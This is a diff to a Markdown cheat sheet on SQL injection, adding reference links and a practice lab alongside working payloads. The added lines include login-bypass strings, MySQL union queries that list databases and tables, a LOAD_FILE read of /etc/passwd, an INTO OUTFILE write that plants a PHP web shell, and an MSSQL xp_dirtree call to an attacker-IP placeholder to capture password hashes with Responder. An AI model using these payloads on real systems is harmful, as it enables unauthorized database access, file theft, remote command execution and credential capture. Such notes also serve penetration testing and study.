@@ -1,5 +1,10 @@
 # SQL Injection
 
+## Cheatsheet
+- https://www.websec.ca/kb/sql_injection#Extra_About
+  - https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit
+- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
 ## Tools
 - SqlMap:
 ```
@@ -34,7 +39,32 @@ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
 SELECT sys_eval('whoami');
 ```
 
+```
+' or 1=1 LIMIT 1 --
+' or 1=1 LIMIT 1 -- -
+' or 1=1 LIMIT 1#
+'or 1#
+' or 1=1 --
+' or 1=1 -- -
+```
 
+### MySQL
+- Order by to get column count: `1337 order by N`
+- Read file: `LOAD_FILE('/etc/passwd')`
+
+```
+union select 1,2,group_concat(distinct table_schema separator ',') from information_schema.tables LIMIT 1,1
+union select 1,2,group_concat(distinct table_name separator ',') from information_schema.tables where table_schema = 'security' LIMIT 1,1
+```
+
+- Write to file: `select 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE 'C:\htdocs\webroot\shell.php'`
+
+### SQL Server
+
+Run Responder and do following to capture hashes:
+```
+EXEC(master..xp_dirtree('\\(ATTACKER IP ADDRESS)\foo')--
+```
 
 ## Techniques
 - Add a trigger to do a malicious action (price 0)
@@ -43,3 +73,8 @@ SELECT sys_eval('whoami');
 
 ### PHP
 - Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)
+
+## Practice 
+
+- https://github.com/Audi-1/sqli-labs
+
